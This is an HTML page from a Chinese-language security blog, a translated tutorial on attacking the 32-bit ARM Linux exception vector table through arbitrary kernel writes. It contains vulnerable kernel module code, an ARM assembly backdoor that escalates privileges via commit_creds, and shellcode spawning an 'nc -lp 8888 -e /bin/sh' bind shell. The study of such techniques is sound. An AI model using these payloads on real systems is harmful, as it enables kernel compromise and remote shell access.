@@ -1,0 +1,650 @@
+
+<!DOCTYPE html>
+<html lang="zh-Hans">
+    
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="generator" content="Edvison&#39;s blog">
+    <title>ARM异常向量表攻击 - Edvison&#39;s blog</title>
+    <meta name="author" content="Edvison">
+    
+    
+        <link rel="icon" href="http://edvison.cn/assets/images/favicon.ico">
+    
+    
+        <link rel="alternate" type="application/atom+xml" title="RSS" href="/atom.xml">
+    
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Edvison","sameAs":["https://github.com/edvison","mailto:edvisonmail@163.com"],"image":"1.png"},"articleBody":"本文是Corrupting the ARM Exception Vector Table的翻译文章。\n\n\n介绍几个月前，我在ARM上撰写Linux内核利用挑战，试图了解内核利用情况，我想我会探索一些事情…我选择ARM架构主要是因为它很有趣。 本文将描述如何在攻击者具有写入what-where原函数的情况下使用ARM异常向量表（EVT）进行内核利用。 它将覆盖本地的利用方案以及远程利用方案。 请注意，EVT攻击已在文章“Vector Rewrite Attack”[1]. 它简要地介绍了如何将它用于ARM RTOS上的NULL指针解引用漏洞。\n文章分为两个主要部分。 首先从利用的角度简要描述ARM EVT及其含义（请注意，为使文章精简，关于EVT的一些内容将被省略）。 我们将举两个例子来说明我们如何利用EVT。\n我假设读者熟悉linux内核开发利用并知道一些ARM程序集（认真）\nARM异常和异常向量表简而言之，EVT就是ARM将IDT与x86相比。 在ARM世界中，异常是导致CPU停止或暂停执行当前指令集的事件。 发生此异常时，CPU将执行转移到另一个称为异常处理程序的位置。 有7种异常类型，每种异常类型都与一种操作模式相关联。 操作模式会影响处理器对系统资源的“权限”。 共有7种操作模式。 下表将一些异常类型映射到其相关的操作模式：\n\n\n\n异常\n模式\n说明\n\n\n\n\n快速中断请求\nFIQ\n需要快速响应和低延迟的中断。\n\n\n中断请求\nIRQ\n用于通用中断处理\n\n\n软件中断或重置\n管理员模式(SVC)\n操作系统的保护模式\n\n\n预读取或数据终止\n终止模式(Abort Mode)\n从无效/无格式内存中获取数据或指令时\n\n\n未定义的指令\n未定义模式(Undef)\n当一个未定义的指令被执行时\n\n\n\n另外两种模式是自我说明的用户模式和系统模式，它是操作系统的特权用户模式\n异常异常会改变处理器模式，每个异常都可以访问一组分区寄存器。 这些可以被描述为只存在于异常情况下的一组寄存器，因此修改它们不会影响另一个异常模式的存储寄存器。 不同的异常模式有不同的分区寄存器：\n\n异常向量表向量表是一个实际包含跳转到相应异常处理程序的控制传输指令的表。 例如，当引发软件中断时，执行会转移到表中的软件中断入口，然后转入系统调用处理程序。 为什么EVT如此有趣地瞄准？ 那么因为它被加载到内存中已知的地址，并且它是可写*和可执行的。 在32位ARM Linux上，这个地址是0xffff0000。 EVT中的每个条目也处于已知偏移量处，如下表所示：\n\n\n\n异常\n地址            \n\n\n\n\n重置\n0xffff0000           \n\n\n未定义指令\n0xffff0004       \n\n\n SWI\n0xffff0008  \n\n\n预读取终止\n0xffff000c       \n\n\n数据终止\n0xffff0010 \n\n\n保留\n0xffff0014  \n\n\n IRQ\n0xffff0018   \n\n\n FIQ\n0xffff001c\n\n\n\n关于未定义指令异常的说明覆盖未定义指令向量似乎是一个伟大的计划，但实际上并不是因为它被内核使用。 硬浮点和软浮点是允许模拟浮点指令的两种解决方案，因为许多ARM平台没有硬件浮点单元。 通过软浮点，仿真代码在编译时被添加到用户空间应用程序中。 使用硬浮点时，内核允许用户空间程序使用浮点指令，就好像CPU支持它们，然后使用未定义指令异常一样，模拟内核中的指令。如果您想阅读关于EVT的更多信息，请查看本文底部的参考资料，或者谷歌。\nEVT攻击我们可以使用几个向量来获得特权代码执行。 显然，覆盖表中的任何向量可能会导致代码执行，但作为节能主义者，让我们尝试最少的工作量。 最简单的覆盖似乎是软件中断向量。 它在进程上下文中执行，系统调用通过那里，一切都很好。 现在我们来看一些PoC/例子。 以下所有示例都已在 Debian 7 ARMel 3.2.0-4-versatile qemu上运行测试。\n本地环境这个易受攻击的模块栗子实现了一个非常明显的任意写漏洞的char设备（或者它是一个特性？）：123456789101112131415161718// called when &apos;write&apos; system call is done on the device filestatic ssize_t on_write(struct file *filp,const char *buff,size_t len,loff_t *off)&#123;    size_t siz = len;    void * where = NULL;    char * what = NULL;    if(siz &gt; sizeof(where))        what = buff + sizeof(where);    else        goto end;    copy_from_user(&amp;where, buff, sizeof(where));    memcpy(where, what, sizeof(void *));end:    return siz;&#125;\n基本上，有了这个冷静而现实的漏洞，你给模块一个地址，然后在该地址写入数据。 现在，我们的计划将是通过使用能跳转到我们的后门代码的代码来覆盖SWI异常向量来获取内核后门。这段代码将检查寄存器中的magic值（比如r7，它包含系统调用号），如果匹配，它将提升调用进程的权限。我们在哪里存储这个后门代码？考虑到我们对内核内存的任意写入，我们可以将其存储在用户空间或内核空间的某处。后一种选择的好处是，如果我们在内核空间中选择适当的位置，只要机器运行，我们的代码就会存在，而前一种选择，一旦我们用户空间的程序退出，代码就会丢失，如果EVT中的条目未恢复到其原始值，它很可能会指向无效/未映射的内存，从而导致系统崩溃。我们需要一个可执行和可写的内核空间位置。 这可能是哪里？ 让我们仔细看看EVT：\n\n正如预期的那样，我们看到一堆控制转移指令，但我们注意到的一件事是“最接近”的引用地址是0xffff0200。 我们来看看EVT和0xffff0200之间的内容：\n\n看起来没有任何东西存在，所以我们有大约480个字节来存储我们的后门，这已经足够了。\nExploit重新整理一下我们的利用步骤：\n\n将我们的后门存储在0xffff0020\n用分支覆盖SWI异常向量0xffff0020\n发生系统调用时，我们的后门将检查r7==0xb0000000，如果为true，则提升调用进程的权限，否则跳转到正常的系统调用处理程序。\n\n这是后门代码：123456789101112131415161718;check if magic    cmp r7, #0xb0000000    bne exitelevate:    stmfd sp!,&#123;r0-r12&#125;    mov r0, #0    ldr r3, =0xc0049a00 ;prepare_kernel_cred    blx r3    ldr r4, =0xc0049438 ;commit_creds    blx r4    ldmfd sp!, &#123;r0-r12, pc&#125;^ ;return to userland;go to syscall handlerexit:    ldr pc, [pc, #980] ;go to normal swi handler\n您可以在这里找到易受攻击的模块和漏洞的完整代码。 运行漏洞利用：\n\n远程环境在这个例子中，我们将使用一个类似前一个漏洞的netfilter模块：1234567891011if(ip-&gt;protocol == IPPROTO_TCP)&#123;       tcp = (struct tcphdr *)(skb_network_header(skb) + ip_hdrlen(skb));       currport = ntohs(tcp-&gt;dest);       if((currport == 9999))&#123;           tcp_data = (char *)((unsigned char *)tcp + (tcp-&gt;doff * 4));           where = ((void **)tcp_data)[0];           len = ((uint8_t *)(tcp_data + sizeof(where)))[0];           what = tcp_data + sizeof(where) + sizeof(len);           memcpy(where, what, len);       &#125;   &#125;\n就像前面的例子一样，这个模块有一个很棒的功能，可以让你将数据写到你想要的任何地方。 在端口tcp / 9999上连接，并给它一个地址，将后面跟着数据的大小和实际数据写在那里。在这种情况下，我们还会通过覆盖SWI异常向量并对内核进行后门来获取内核后门。 代码将执行到我们的shellcode，我们也将像前一个例子那样存储0xffff020。在这个远程场景中重写SWI向量尤其是一个好主意，因为它可以让我们从中断上下文切换到进程上下文。因此，我们的后门将在支持进程的上下文中执行，并“劫持”这个进程并用绑定shell或连接返回shell来覆盖它的代码段。 但我们不会这样做。 让我们快速检查一下：\n\n你可以看到，EVT是一个共享内存段。 它可以从用户空间执行并从内核空间写入*。不要覆盖正在进行系统调用的进程的代码段，而只需在我们的第一阶段之后将代码存储在EVT中，然后返回即可。 每个系统调用都通过SWI向量，所以我们不必等待一个进程陷入陷阱。\nExploit利用步骤：\n\n将我们的第一阶段和第二阶段shellcode存储在0xffff0020（一个接一个）。\n用分支覆盖SWI异常向量0xffff0020。\n发生系统调用时，我们的第一阶段shellcode会将链接寄存器设置为我们第二阶段shellcode的地址（它也存储在EVT中，并将从用户空间执行），然后返回到用户空间。\n调用进程将在我们第二阶段的地址“恢复执行”，这只是一个绑定shell。\n\n下面是第一、二阶段shellcode:123456789101112131415161718192021222324252627282930313233343536373839404142stage_1:    adr lr, stage_2    push &#123;lr&#125;    stmfd sp!, &#123;r0-r12&#125;    ldr r0, =0xe59ff410 ; intial value at 0xffff0008 which is                                ; ldr pc, [pc, #1040] ; 0xffff0420    ldr r1, =0xffff0008    str r0, [r1]    ldmfd sp!, &#123;r0-r12, pc&#125;^ ; return to userlandstage_2:    ldr r0, =0x6e69622f ; /bin    ldr r1, =0x68732f2f ; /sh    eor r2, r2, r2 ; 0x00000000    push &#123;r0, r1, r2&#125;    mov r0, sp    ldr r4, =0x0000632d ; -c\\x00\\x00    push &#123;r4&#125;    mov r4, sp    ldr r5, =0x2d20636e    ldr r6, =0x3820706c    ldr r7, =0x20383838 ; nc -lp 8888 -e /bin//sh    ldr r8, =0x2f20652d    ldr r9, =0x2f6e6962    ldr r10, =0x68732f2f    eor r11, r11, r11    push &#123;r5-r11&#125;    mov r5, sp    push &#123;r2&#125;    eor r6, r6, r6    push &#123;r0,r4,r5, r6&#125;    mov r1, sp    mov r7, #11    swi 0x0    mov r0, #99    mov r7, #1    swi 0x0\n您可以在这里找到易受攻击的模块和漏洞的完整代码。 运行漏洞利用：\n\n奖励：中断堆栈溢出在大多数内存布局中，中断堆栈似乎与EVT相邻。谁知道如果有堆栈溢出之类的事情会发生什么样的有趣事情？\n关于\n本文中讨论的技术假设攻击已经知道内核地址，而这可能并非总是如此。\n我们存储shellcode（0xffff0020）的位置可能会或可能不会被其他发行版的内核使用。\n我在这里写的实验代码仅仅是PoC; 他们肯定可以改进。 例如，在远程方案中，如果事实证明init进程是被劫持的进程，则在我们退出绑定shell之后，该方框会崩溃。\n如果您没有注意到，这里提到的“漏洞”并不是真正的漏洞，但这不是本文的重点。\n\n*EVT似乎可以映射为只读，因此可能无法在较新/某些版本的Linux内核中写入。\n最后的话除此之外，grsec通过设置页面为只读来防止修改EVT。 如果你想玩一些有趣的内核挑战，请查看w3challs上的“kernelpanic”分支。Cheers，@amatcama\n参考[1] Vector Rewrite Attack[2] Recent ARM Security Improvements[3] Entering an Exception[4] SWI handlers[5] ARM Exceptions[6] Exception and Interrupt Handling in ARM\n","dateCreated":"2018-07-25T17:43:26+08:00","dateModified":"2018-07-25T17:46:59+08:00","datePublished":"2018-07-25T17:43:26+08:00","description":"本文是Corrupting the ARM Exception Vector Table的翻译文章。","headline":"ARM异常向量表攻击","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://edvison.cn/2018/07/25/ARM异常向量表攻击/"},"publisher":{"@type":"Organization","name":"Edvison","sameAs":["https://github.com/edvison","mailto:edvisonmail@163.com"],"image":"1.png","logo":{"@type":"ImageObject","url":"1.png"}},"url":"http://edvison.cn/2018/07/25/ARM异常向量表攻击/","keywords":"linux, ARM, kernel"}</script>
+    <meta name="description" content="本文是Corrupting the ARM Exception Vector Table的翻译文章。">
+<meta name="keywords" content="linux,ARM,kernel">
+<meta property="og:type" content="blog">
+<meta property="og:title" content="ARM异常向量表攻击">
+<meta property="og:url" content="http://edvison.cn/2018/07/25/ARM异常向量表攻击/index.html">
+<meta property="og:site_name" content="Edvison&#39;s blog">
+<meta property="og:description" content="本文是Corrupting the ARM Exception Vector Table的翻译文章。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180629134739-eee9e25c-7b5f-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180629134739-eef93ae0-7b5f-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180629134739-ef184156-7b5f-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180629134739-ef27eb9c-7b5f-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180629134740-ef4130ac-7b5f-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180629134740-ef57fba2-7b5f-1.png">
+<meta property="og:updated_time" content="2018-07-25T09:46:59.197Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ARM异常向量表攻击">
+<meta name="twitter:description" content="本文是Corrupting the ARM Exception Vector Table的翻译文章。">
+<meta name="twitter:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180629134739-eee9e25c-7b5f-1.png">
+    
+    
+        
+    
+    
+        <meta property="og:image" content="http://edvison.cn/assets/images/1.png"/>
+    
+    
+    
+    
+    <!--STYLES-->
+    <link rel="stylesheet" href="/assets/css/font-awesome.css">
+    <link rel="stylesheet" href="/assets/css/jquery.fancybox.css">
+    <link rel="stylesheet" href="/assets/css/thumbs.css">
+    <link rel="stylesheet" href="/assets/css/tranquilpeak.css">
+    <!--STYLES END-->
+    
+
+    
+</head>
+
+    <body>
+        <div id="blog">
+            <!-- Define author's picture -->
+
+
+    
+        
+            
+        
+    
+
+<header id="header" data-behavior="5">
+    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+    <div class="header-title">
+        <a class="header-title-link" href="/ ">Edvison&#39;s blog</a>
+    </div>
+    
+        
+            <a  class="header-right-picture "
+                href="#about">
+        
+        
+            <img class="header-picture" src="/assets/images/1.png" alt="Bild des Autors"/>
+        
+        </a>
+    
+</header>
+
+            <!-- Define author's picture -->
+
+
+
+        
+    
+
+<nav id="sidebar" data-behavior="5">
+    <div class="sidebar-container">
+        
+            <div class="sidebar-profile">
+                <a href="/#about">
+                    <img class="sidebar-profile-picture" src="/assets/images/1.png" alt="Bild des Autors"/>
+                </a>
+                <h4 class="sidebar-profile-name">Edvison</h4>
+                
+                    <h5 class="sidebar-profile-bio"><p>Just the way you are</p>
+</h5>
+                
+            </div>
+        
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/ "
+                            
+                            title="Home"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-lg fa-home" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Home</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/all-categories"
+                            
+                            title="categories"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-lg fa-bookmark" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">categories</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/all-tags"
+                            
+                            title="tags"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-lg fa-tags" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">tags</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/all-archives"
+                            
+                            title="archives"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-lg fa-archive" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">archives</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link open-algolia-search"
+                             href="#search"
+                            
+                            title="search"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-lg fa-search" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">search</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="#about"
+                            
+                            title="about"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-lg fa-question" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">about</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link " href="https://github.com/edvison" target="_blank" rel="noopener" title="GitHub">
+                    
+                        <i class="sidebar-button-icon fa fa-lg fa-github" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">GitHub</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link " href="mailto:edvisonmail@163.com" target="_blank" rel="noopener" title="E-Mail">
+                    
+                        <i class="sidebar-button-icon fa fa-lg fa-envelope-o" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">E-Mail</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/atom.xml"
+                            
+                            title="RSS"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-lg fa-rss" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">RSS</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+    </div>
+</nav>
+
+            
+            <div id="main" data-behavior="5"
+                 class="
+                        hasCoverMetaIn
+                        ">
+                
+<article class="post">
+    
+    
+        <div class="post-header main-content-wrap text-left">
+    
+        <h1 class="post-title">
+            ARM异常向量表攻击
+        </h1>
+    
+    
+        <div class="post-meta">
+    <time datetime="2018-07-25T17:43:26+08:00">
+	
+		    25 Jul 2018
+    	
+    </time>
+    
+        <span>in </span>
+        
+    <a class="category-link" href="/categories/kernel/">kernel</a>
+
+
+    
+</div>
+
+    
+</div>
+
+    
+    <div class="post-content markdown">
+        <div class="main-content-wrap">
+            <p>本文是<a href="https://doar-e.github.io/blog/2014/04/30/corrupting-arm-evt/" target="_blank" rel="noopener">Corrupting the ARM Exception Vector Table</a>的翻译文章。</p>
+<a id="more"></a>
+<h1 id="table-of-contents">Inhaltsverzeichnis</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#介绍"><span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ARM异常和异常向量表"><span class="toc-text">ARM异常和异常向量表</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#异常"><span class="toc-text">异常</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#异常向量表"><span class="toc-text">异常向量表</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#关于未定义指令异常的说明"><span class="toc-text">关于未定义指令异常的说明</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#EVT攻击"><span class="toc-text">EVT攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#本地环境"><span class="toc-text">本地环境</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit"><span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#远程环境"><span class="toc-text">远程环境</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-1"><span class="toc-text">Exploit</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#奖励：中断堆栈溢出"><span class="toc-text">奖励：中断堆栈溢出</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#关于"><span class="toc-text">关于</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#最后的话"><span class="toc-text">最后的话</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考"><span class="toc-text">参考</span></a></li></ol>
+<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>几个月前，我在ARM上撰写Linux内核利用挑战，试图了解内核利用情况，我想我会探索一些事情…我选择ARM架构主要是因为它很有趣。 本文将描述如何在攻击者具有写入what-where原函数的情况下使用ARM异常向量表（EVT）进行内核利用。 它将覆盖本地的利用方案以及远程利用方案。 请注意，EVT攻击已在文章“Vector Rewrite Attack”<a href="https://cansecwest.com/slides07/Vector-Rewrite-Attack.pdf" target="_blank" rel="noopener">[1]</a>. 它简要地介绍了如何将它用于ARM RTOS上的NULL指针解引用漏洞。</p>
+<p>文章分为两个主要部分。 首先从利用的角度简要描述ARM EVT及其含义（请注意，为使文章精简，关于EVT的一些内容将被省略）。 我们将举两个例子来说明我们如何利用EVT。</p>
+<p>我假设读者熟悉linux内核开发利用并知道一些ARM程序集（认真）</p>
+<h1 id="ARM异常和异常向量表"><a href="#ARM异常和异常向量表" class="headerlink" title="ARM异常和异常向量表"></a>ARM异常和异常向量表</h1><p>简而言之，EVT就是ARM将IDT与x86相比。 在ARM世界中，异常是导致CPU停止或暂停执行当前指令集的事件。 发生此异常时，CPU将执行转移到另一个称为异常处理程序的位置。 有7种异常类型，每种异常类型都与一种操作模式相关联。 操作模式会影响处理器对系统资源的“权限”。 共有7种操作模式。 下表将一些异常类型映射到其相关的操作模式：</p>
+<table>
+<thead>
+<tr>
+<th>异常</th>
+<th>模式</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>快速中断请求</td>
+<td>FIQ</td>
+<td>需要快速响应和低延迟的中断。</td>
+</tr>
+<tr>
+<td>中断请求</td>
+<td>IRQ</td>
+<td>用于通用中断处理</td>
+</tr>
+<tr>
+<td>软件中断或重置</td>
+<td>管理员模式(SVC)</td>
+<td>操作系统的保护模式</td>
+</tr>
+<tr>
+<td>预读取或数据终止</td>
+<td>终止模式(Abort Mode)</td>
+<td>从无效/无格式内存中获取数据或指令时</td>
+</tr>
+<tr>
+<td>未定义的指令</td>
+<td>未定义模式(Undef)</td>
+<td>当一个未定义的指令被执行时</td>
+</tr>
+</tbody>
+</table>
+<p>另外两种模式是自我说明的用户模式和系统模式，它是操作系统的特权用户模式</p>
+<h1 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h1><p>异常会改变处理器模式，每个异常都可以访问一组分区寄存器。 这些可以被描述为只存在于异常情况下的一组寄存器，因此修改它们不会影响另一个异常模式的存储寄存器。 不同的异常模式有不同的分区寄存器：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180629134739-eee9e25c-7b5f-1.png" alt="14188640.png"></p>
+<h1 id="异常向量表"><a href="#异常向量表" class="headerlink" title="异常向量表"></a>异常向量表</h1><p>向量表是一个实际包含跳转到相应异常处理程序的控制传输指令的表。 例如，当引发软件中断时，执行会转移到表中的软件中断入口，然后转入系统调用处理程序。 为什么EVT如此有趣地瞄准？ 那么因为它被加载到内存中已知的地址，并且它是可写*和可执行的。 在32位ARM Linux上，这个地址是0xffff0000。 EVT中的每个条目也处于已知偏移量处，如下表所示：</p>
+<table>
+<thead>
+<tr>
+<th>异常</th>
+<th>地址            </th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>重置</td>
+<td>0xffff0000           </td>
+</tr>
+<tr>
+<td>未定义指令</td>
+<td>0xffff0004       </td>
+</tr>
+<tr>
+<td> SWI</td>
+<td>0xffff0008  </td>
+</tr>
+<tr>
+<td>预读取终止</td>
+<td>0xffff000c       </td>
+</tr>
+<tr>
+<td>数据终止</td>
+<td>0xffff0010 </td>
+</tr>
+<tr>
+<td>保留</td>
+<td>0xffff0014  </td>
+</tr>
+<tr>
+<td> IRQ</td>
+<td>0xffff0018   </td>
+</tr>
+<tr>
+<td> FIQ</td>
+<td>0xffff001c</td>
+</tr>
+</tbody>
+</table>
+<h2 id="关于未定义指令异常的说明"><a href="#关于未定义指令异常的说明" class="headerlink" title="关于未定义指令异常的说明"></a>关于未定义指令异常的说明</h2><p>覆盖未定义指令向量似乎是一个伟大的计划，但实际上并不是因为它被内核使用。 硬浮点和软浮点是允许模拟浮点指令的两种解决方案，因为许多ARM平台没有硬件浮点单元。 通过软浮点，仿真代码在编译时被添加到用户空间应用程序中。 使用硬浮点时，内核允许用户空间程序使用浮点指令，就好像CPU支持它们，然后使用未定义指令异常一样，模拟内核中的指令。<br>如果您想阅读关于EVT的更多信息，请查看本文底部的参考资料，或者谷歌。</p>
+<h1 id="EVT攻击"><a href="#EVT攻击" class="headerlink" title="EVT攻击"></a>EVT攻击</h1><p>我们可以使用几个向量来获得特权代码执行。 显然，覆盖表中的任何向量可能会导致代码执行，但作为节能主义者，让我们尝试最少的工作量。 最简单的覆盖似乎是软件中断向量。 它在进程上下文中执行，系统调用通过那里，一切都很好。 现在我们来看一些PoC/例子。 以下所有示例都已在 Debian 7 ARMel 3.2.0-4-versatile qemu上运行测试。</p>
+<h2 id="本地环境"><a href="#本地环境" class="headerlink" title="本地环境"></a>本地环境</h2><p>这个易受攻击的模块栗子实现了一个非常明显的任意写漏洞的char设备（或者它是一个特性？）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// called when &apos;write&apos; system call is done on the device file</span><br><span class="line">static ssize_t on_write(struct file *filp,const char *buff,size_t len,loff_t *off)</span><br><span class="line">&#123;</span><br><span class="line">    size_t siz = len;</span><br><span class="line">    void * where = NULL;</span><br><span class="line">    char * what = NULL;</span><br><span class="line"></span><br><span class="line">    if(siz &gt; sizeof(where))</span><br><span class="line">        what = buff + sizeof(where);</span><br><span class="line">    else</span><br><span class="line">        goto end;</span><br><span class="line"></span><br><span class="line">    copy_from_user(&amp;where, buff, sizeof(where));</span><br><span class="line">    memcpy(where, what, sizeof(void *));</span><br><span class="line"></span><br><span class="line">end:</span><br><span class="line">    return siz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>基本上，有了这个冷静而现实的漏洞，你给模块一个地址，然后在该地址写入数据。 现在，我们的计划将是通过使用能跳转到我们的后门代码的代码来覆盖SWI异常向量来获取内核后门。这段代码将检查寄存器中的magic值（比如r7，它包含系统调用号），如果匹配，它将提升调用进程的权限。<br>我们在哪里存储这个后门代码？考虑到我们对内核内存的任意写入，我们可以将其存储在用户空间或内核空间的某处。<br>后一种选择的好处是，如果我们在内核空间中选择适当的位置，只要机器运行，我们的代码就会存在，而前一种选择，一旦我们用户空间的程序退出，代码就会丢失，如果EVT中的条目未恢复到其原始值，它很可能会指向无效/未映射的内存，从而导致系统崩溃。<br>我们需要一个可执行和可写的内核空间位置。 这可能是哪里？ 让我们仔细看看EVT：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180629134739-eef93ae0-7b5f-1.png" alt="18998328.png"></p>
+<p>正如预期的那样，我们看到一堆控制转移指令，但我们注意到的一件事是“最接近”的引用地址是0xffff0200。 我们来看看EVT和0xffff0200之间的内容：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180629134739-ef184156-7b5f-1.png" alt="19046296.png"></p>
+<p>看起来没有任何东西存在，所以我们有大约480个字节来存储我们的后门，这已经足够了。</p>
+<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>重新整理一下我们的利用步骤：</p>
+<ol>
+<li>将我们的后门存储在0xffff0020</li>
+<li>用分支覆盖SWI异常向量0xffff0020</li>
+<li>发生系统调用时，我们的后门将检查r7==0xb0000000，如果为true，则提升调用进程的权限，否则跳转到正常的系统调用处理程序。</li>
+</ol>
+<p>这是后门代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">;check if magic</span><br><span class="line">    cmp r7, #0xb0000000</span><br><span class="line">    bne exit</span><br><span class="line"></span><br><span class="line">elevate:</span><br><span class="line">    stmfd sp!,&#123;r0-r12&#125;</span><br><span class="line"></span><br><span class="line">    mov r0, #0</span><br><span class="line">    ldr r3, =0xc0049a00 ;prepare_kernel_cred</span><br><span class="line">    blx r3</span><br><span class="line">    ldr r4, =0xc0049438 ;commit_creds</span><br><span class="line">    blx r4</span><br><span class="line"></span><br><span class="line">    ldmfd sp!, &#123;r0-r12, pc&#125;^ ;return to userland</span><br><span class="line"></span><br><span class="line">;go to syscall handler</span><br><span class="line">exit:</span><br><span class="line">    ldr pc, [pc, #980] ;go to normal swi handler</span><br></pre></td></tr></table></figure></p>
+<p>您可以在<a href="https://github.com/acama/arm-evt/tree/master/local_example" target="_blank" rel="noopener">这里</a>找到易受攻击的模块和漏洞的完整代码。 运行漏洞利用：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180629134739-ef27eb9c-7b5f-1.png" alt="19402187.png"></p>
+<h2 id="远程环境"><a href="#远程环境" class="headerlink" title="远程环境"></a>远程环境</h2><p>在这个例子中，我们将使用一个类似前一个漏洞的netfilter模块：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">if(ip-&gt;protocol == IPPROTO_TCP)&#123;</span><br><span class="line">       tcp = (struct tcphdr *)(skb_network_header(skb) + ip_hdrlen(skb));</span><br><span class="line">       currport = ntohs(tcp-&gt;dest);</span><br><span class="line">       if((currport == 9999))&#123;</span><br><span class="line">           tcp_data = (char *)((unsigned char *)tcp + (tcp-&gt;doff * 4));</span><br><span class="line">           where = ((void **)tcp_data)[0];</span><br><span class="line">           len = ((uint8_t *)(tcp_data + sizeof(where)))[0];</span><br><span class="line">           what = tcp_data + sizeof(where) + sizeof(len);</span><br><span class="line">           memcpy(where, what, 